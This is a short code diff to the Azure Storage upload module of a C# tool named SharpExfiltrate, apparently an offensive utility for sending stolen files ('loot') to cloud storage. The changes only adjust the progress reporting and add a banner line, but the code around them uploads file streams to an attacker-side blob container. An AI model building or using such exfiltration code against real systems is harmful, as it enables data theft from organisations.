@@ -34,8 +34,8 @@ namespace SharpExfiltrate.Modules
         private void UploadProgressChanged(object sender, StorageProgress progress)
         {
 
-            //Only show every 60 progress update, Azure spams!
-            if (ProgressCount == 60)
+            //Only show every 80 progress update, Azure spams!
+            if (ProgressCount == 80)
             {
                 int progressValue = (int)((float)((float)progress.BytesTransferred / (float)StreamSize) * (float)100.00);
 
@@ -52,9 +52,12 @@ namespace SharpExfiltrate.Modules
 
         public async Task<string> UploadFile(Stream stream, string filename)
         {
+            Console.WriteLine("[+] Launching AzureStorage module by @Flangvik");
+
             ProgressCount = 0;
             StreamSize = stream.Length;
             FileName = filename;
+
             CancellationToken cancellationToken = new CancellationToken();
 
             CloudBlockBlob cloudBlockBlob = lootCloudContainer.GetBlockBlobReference(filename);
